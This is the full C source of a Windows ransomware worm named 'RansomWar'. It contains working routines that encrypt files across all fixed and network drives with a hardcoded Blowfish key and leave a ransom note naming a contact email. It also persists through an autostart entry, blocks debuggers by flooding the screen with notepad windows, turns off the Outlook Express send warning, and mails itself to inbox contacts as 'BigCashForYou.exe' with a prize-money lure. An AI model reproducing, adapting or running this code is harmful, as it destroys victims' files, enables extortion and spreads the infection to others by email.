/* Nothing to say :) ... thx to SkyOut for trusting in me */

#include <windows.h>
#include <mapi.h>
#include "crypt.h" /* crypt header */

/* This is the new extension of a "ransomed" file */
#define RANSOMED_EXT ".rwg"

/* Count of crypted files */
static DWORD Enc_Files = 0;

/* never displayed msg */
char *never_displayed = "RansomWar by [WarGame,#eof] ( **** ti amo anche se tu non mi ricambi )";

/* MsG to user */
DWORD WINAPI MsgToUser(LPVOID Data)
{
	char text_file[MAX_PATH];
	HANDLE text_fd = NULL;
    DWORD written_bytes = 0;
	
	/* Create text file with instructions */
	GetSystemDirectory(text_file,MAX_PATH);
	strcat(text_file,"\\RansomWar.txt");

	if((text_fd = CreateFile(text_file,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,
		CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE)
	{
#define WRITE_LINE(str) WriteFile(text_fd,str,strlen(str),&written_bytes,NULL);
		WRITE_LINE("Dear user,\r\n some of your files have been encrypted using a quite strong system.\r\n");
		WRITE_LINE("Now you are scared but I will not ask you for money.\r\n");
		WRITE_LINE("If you want to get back your files you can do following:\r\n");
        WRITE_LINE("1) Contact a good antivirus-company that will decrypt them for you\r\n");
		WRITE_LINE("2) You can send an email to back9001@yahoo.com requesting a decryptor program\r\n");
		WRITE_LINE("3) You can launch your PC trought the window or use a better OS (like linux) :)\r\n");
		WRITE_LINE("\r\n\r\n RansomWar by [WarGame,#eof]\r\n");
		CloseHandle(text_fd);
		ShellExecute(NULL,"open",text_file,NULL,NULL,SW_SHOW);
	}
}

/* hehe blowfish encryption :) */
void Encrypt_File(char *filename)
{
    char *in = NULL,*out = NULL;
	HANDLE file_fd = NULL;
	DWORD file_size = 0,written_bytes,read_bytes,cnt = 0,ThreadID = 0,Orig;
	union symmetric_key skey;
	char ransom_name[MAX_PATH];
	
	if(blowfish_setup("!&0#]<?^",8,0,&skey) == CRYPT_ERROR)
	{
		  /* Fail to setup blowfish */
		return;
	}

	if((file_fd = CreateFile(filename,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
	{
		 /* Fail to open */
		return;
	}

	file_size = GetFileSize(file_fd,NULL);
	
	if(file_size == 0xFFFFFFFF)
	{
		 /* Fail to get size */
		CloseHandle(file_fd);
		return;
	}

	/* filesize % 8 == 0 */
    if(file_size % 8 != 0) 
	{
	file_size = ((file_size/8)+1)*8;
	}

	/* Ok, allocate memory */
	in = (char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,file_size);
	out = (char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,file_size);
    
	if(in == NULL || out == NULL)
	{
		 /* Fail to allocate memory */
		CloseHandle(file_fd);
		return;
	}

#define FREE_ALL GlobalFree(in); \
	             GlobalFree(out); \
	             CloseHandle(file_fd);
	
	/* Read entire file in buf */
	if(ReadFile(file_fd,in,file_size,&read_bytes,NULL) == 0)
	{
		/* Fail to read */
		FREE_ALL
		return;
	}
	
	/* Write encrypted version */
	SetFilePointer(file_fd,0,0,FILE_BEGIN);
	
	 /* Encrypt ! */
	  for(cnt = 0;cnt < file_size;cnt+=8)
	  {
	blowfish_ecb_encrypt(in+cnt,out+cnt,&skey);
	  }

	if(WriteFile(file_fd,out,file_size,&written_bytes,NULL) == 0)
	{
		/* Fail to write */
		FREE_ALL
		return;
	}
	
	/* Free */
	FREE_ALL

	/* Rename */
	strcpy(ransom_name,filename);
	strcat(ransom_name,RANSOMED_EXT);
	MoveFile(filename,ransom_name);

	/* Increment :) */
	Enc_Files++;

	 /* MsG for user */
	if(Enc_Files > 150)
	{
		 /* so the encryption goes on */
		CreateThread(NULL,0,&MsgToUser,0,0,&ThreadID);
		Enc_Files = 0;
	}
}

/* This is the function used to scan drives for files */
void S3arch(char *pt) {
	 char sc[MAX_PATH],buf[MAX_PATH];
	 WIN32_FIND_DATA in;
	 HANDLE fd,file;
	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";

	 if(strlen(pt) == 3) 
	 {
		pt[2] = '\0'; /* :-) */
	 }
	 
	 sprintf(sc,fm1,pt);
     fd = FindFirstFile(sc,&in);
 
 do
 {
	
	 sprintf(buf,fm,pt,in.cFileName);

	   /* dot :) */
	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) 
	 {
		 S3arch(buf);
	 }
	 
	   /* File found */
	 else 
	 {
		 
		 /* is it good to encrypt ? */

		 if(!strstr(in.cFileName,RANSOMED_EXT) && !strstr(in.cFileName,".dll") 
			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
		 {
			 Encrypt_File(buf);
		 }
	 }
	 
 }while(FindNextFile(fd,&in));
 
 FindClose(fd);
}

/* Antidebugging routine */
DWORD WINAPI AntiDebug(LPVOID Data)
{
 /* Get IsDebuggerPresent() API */
	HANDLE Lib = LoadLibrary("kernel32.dll");
	FARPROC DbG = GetProcAddress(Lib,"IsDebuggerPresent");

	if(DbG == NULL)
	{
		 /* No API */
		return;
	}
	
	for(;;)
	{
		  /* Check if debugged */
        if((*DbG)())
		{
		       /* MsG to debugger */	
			OutputDebugString("do you want to kill me?");
			
			 /* :) */
			while(1)
			{
				WinExec("notepad.exe",SW_SHOW);
			}
		}
		
		 /* 2 seconds */
		Sleep(2000);
	}
}

/* Our evil thread ! */
DWORD WINAPI R4ns0m(LPVOID Data)
{
	    char Drives[3],Drive = 0;
		UINT drive_type;

	while(1)
	{
	
		  /* Search for drives */
		for(Drive = 'C';Drive <= 'Z';Drive++)
		{
		Drives[0] = Drive;
		Drives[1] = ':';
		Drives[2] = '\\';
		Drives[3] = '\0';

		/* drive ? */
		drive_type = GetDriveType(Drives);
		      
		          /* only fixed and remote drives */
		       if(drive_type == DRIVE_FIXED || drive_type == DRIVE_REMOTE)
			   {
				     /* GO! */
				   S3arch(Drives);
			   }
		}

		/* every 10 minutes */
		Sleep((1000*60)*10);
	}
}

/* This it the function that sends e-mail */
void SendMail(char *addr,LPMAPISENDMAIL SnM,LHANDLE lhSession,char *VirPath) {
	 
	   /* build mail */
	 MapiRecipDesc *recips  = (MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
	 
	 MapiFileDesc attachment = { 0, 0, (ULONG)-1,VirPath,"BigCashForYou.exe", NULL};
     
	 MapiMessage note = { 0, "You are a very lucky man, read this mail!",
		 "Hi, you won a big amount of money!!! If you want to know more look at the attachment!", NULL, 
		 NULL, NULL, 0, NULL,1, recips, 1, &attachment};
                
	            recips->ulReserved = 0;
                recips->ulRecipClass = MAPI_TO;
                recips->lpszName     = addr;
                recips->lpszAddress  = addr;
                recips->ulEIDSize    = 0;
                recips->lpEntryID    = NULL;
         
	  /* Send ! */
	SnM(lhSession, 0L, &note, 0L, 0L); 
	
	 /* free memory */
	free(recips);
}

 /* Disable mapi warning */
DWORD DisableMAPIWarning(void) /* From Tamiami, thx DiA */
{
	HKEY			RegHandle1;
	HKEY			RegHandle2;
	char			DefaultUserId[100];
	DWORD			DefaultUserSize = sizeof(DefaultUserId);
	DWORD			WarnDisable = 0;

	if(RegOpenKeyEx(HKEY_CURRENT_USER, "Identities", 0, KEY_QUERY_VALUE, &RegHandle1) == ERROR_SUCCESS)
	{
		if(RegQueryValueEx(RegHandle1, "Default User ID", 0, 0, (BYTE *)&DefaultUserId, &DefaultUserSize) == ERROR_SUCCESS)
		{
			if(lstrcat(DefaultUserId, "\\Software\\Microsoft\\Outlook Express\\5.0\\Mail") != 0)
			{
				if(RegOpenKeyEx(RegHandle1, DefaultUserId, 0, KEY_SET_VALUE, &RegHandle2) == ERROR_SUCCESS)
				{
					RegSetValueEx(RegHandle2, "Warn on Mapi Send", 0, REG_DWORD, (BYTE *)&WarnDisable, sizeof(WarnDisable));
					
					RegCloseKey(RegHandle2);
					RegCloseKey(RegHandle1);

					return 1;
				}
			}
		}

		RegCloseKey(RegHandle1);
	}

	return 0;
}

/* MAPI mailing routine */
DWORD WINAPI MailMySelf(LPVOID Data)
{
           /* Variables and pointers to MAPI functions */
   	    CHAR rgchMsgID[513];
        MapiMessage *lpMessage;
		HINSTANCE hi;
        LPMAPILOGON MAPILogon;
        LPMAPIFINDNEXT MAPIFindNext;
        LPMAPIREADMAIL MAPIReadMail;
        LPMAPISENDMAIL MAPISendMail;
        LPMAPILOGOFF MAPILogoff;
        LHANDLE lhSession;
		char dropper[MAX_PATH];
		char MyPath[MAX_PATH];
        
		if(!(hi = LoadLibrary( "mapi32.dll" ))) 
		{
			/* Fail to load mapi */
			return;
		}

           /* Get mapi functions */
		MAPILogon = (LPMAPILOGON)GetProcAddress( hi, "MAPILogon");
        
		MAPIFindNext = (LPMAPIFINDNEXT)GetProcAddress( hi, "MAPIFindNext");
        
		MAPIReadMail = (LPMAPIREADMAIL)GetProcAddress( hi, "MAPIReadMail");
        
		MAPISendMail = (LPMAPISENDMAIL)GetProcAddress( hi, "MAPISendMail");
		
		MAPILogoff = (LPMAPILOGOFF)GetProcAddress(hi,"MAPILogoff");
  
       /* Check them */
  if( MAPILogon == NULL || MAPIFindNext == NULL || MAPIReadMail == NULL || 
	  MAPISendMail == NULL || MAPILogoff == NULL) 
  {
	  /* No MAPI functions :( */
	  return;
  }
  
  /* Copy to dropper */
  GetModuleFileName(NULL,MyPath,MAX_PATH);
  GetSystemDirectory(dropper,MAX_PATH);
  strcat(dropper,"\\kkk.exe");
  CopyFile(MyPath,dropper,FALSE);

      /* Ok !, try to login  */
  if(MAPILogon( 0, NULL, NULL, 0, 0, &lhSession) == SUCCESS_SUCCESS)
  {
                
	  *rgchMsgID = NULL;
                
				while(1)
                {
                    
					if(MAPIFindNext( lhSession, 0L, NULL, rgchMsgID, MAPI_LONG_MSGID, 0L, rgchMsgID) != SUCCESS_SUCCESS) 
					{
			           break;
					}
                    
					        /* Read mail */
					    if( MAPIReadMail( lhSession, 0L, rgchMsgID, MAPI_PEEK, 0L, &lpMessage) == SUCCESS_SUCCESS)
						{
				              /* Send ! */     
							SendMail(lpMessage->lpOriginator->lpszAddress,MAPISendMail,
								lhSession,dropper);
						}
			}
				
				MAPILogoff( lhSession, 0L, 0L, 0L);
  
  }

  FreeLibrary(hi);

}

  /* Main */
int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    char MyPath[MAX_PATH],new_path[MAX_PATH];
	DWORD ThreadID;
	SYSTEMTIME tm;
		
	/* anti-debug */
	CreateThread(NULL,0,&AntiDebug,0,0,&ThreadID);
	
	/* Only one istance of worm can run */
    CreateMutex(NULL,FALSE,"RansomWar_EOF");

	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		/* Fake  */
	    MessageBox(NULL,"Internal error in module gdi32.dll","Error",
			MB_OK|MB_ICONERROR);
		ExitProcess(0);
	}

    /* Where am I ? */
	GetModuleFileName(NULL,MyPath,MAX_PATH);

	/* Get system directory */
	GetSystemDirectory(new_path,MAX_PATH);

	/* copy ! */
	strcat(new_path,"\\recovery.exe");
	CopyFile(MyPath,new_path,FALSE);

	/* set at autostart */
	WriteProfileString("windows","run",new_path);

	/* create main thread */
	CreateThread(NULL,0,&R4ns0m,0,0,&ThreadID);
	
	/* Get system time */
	GetSystemTime(&tm);
	
	/* Disable MAPI warning and check the day */
	if(DisableMAPIWarning() && (tm.wDay % 2 == 0))
	{
	/* MAPI mailing */
	CreateThread(NULL,0,&MailMySelf,0,0,&ThreadID);
	}
	
	/* Sleep ... */
	Sleep(INFINITE);
}